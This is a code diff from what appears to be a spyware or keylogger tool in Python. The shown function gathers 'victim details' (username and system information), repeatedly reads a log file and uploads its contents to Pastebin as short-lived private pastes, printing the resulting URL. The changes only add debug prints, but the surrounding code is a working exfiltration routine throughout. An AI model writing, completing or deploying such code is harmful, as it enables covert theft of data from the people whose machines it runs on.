@@ -43,19 +43,25 @@ def fill_buffer_upload(myInode, uploadInterval):
     bufferToUp = {getpass.getuser():("Victim details: {}".format(uname()))}
     try:
         api = get_pastebin_api()
+        print(api)
     except Exception as e:
         print(e)
     try:
+        print('inside file')
         f = open(myInode)
             
     except Exception as e:
         print(e)
     while exists(myInode):
+        print('inside exis')
         sleep(uploadInterval)
         bufferToUp[ct]= f.read()
+        print(bufferToUp)
         if(sys.getsizeof(bufferToUp)>1000):
             data = json.dumps(bufferToUp)
             result = api.paste(data, guest=True, name="Logs for: {}".format(getpass.getuser()), format='json', private='1', expire='10M')
+            sleep(2)
+            print(result)
             if 'Bad API request' not in result:
                 print('[+] - PasteBin URL: ' + result)
                 bufferToUp.clear()
